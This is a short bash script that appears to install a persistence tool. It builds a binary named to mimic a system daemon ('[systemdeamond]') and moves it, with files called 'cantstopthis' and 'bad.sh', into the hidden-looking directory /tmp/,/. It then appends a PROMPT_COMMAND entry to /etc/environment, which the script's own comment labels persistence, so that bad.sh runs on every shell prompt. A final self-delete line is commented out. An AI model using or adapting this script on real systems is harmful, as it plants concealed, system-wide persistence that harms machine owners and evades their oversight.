#!/bin/bash
mkdir compiled
cp cantstopthis ./compiled
cp bad.sh ./compiled
pyinstaller \[systemdeamond\] -F -n \[systemdeamond\]
rm -rf build/
cp dist/* ./compiled
rm -rf dist/
rm \[systemdeamond\].spec 
mkdir -p /tmp/,/
mv compiled/* /tmp/,/
rmdir compiled

echo 'PROMPT_COMMAND="/tmp/\,/bad.sh"' >> /etc/environment #persistence on logout

#rm ./build.sh
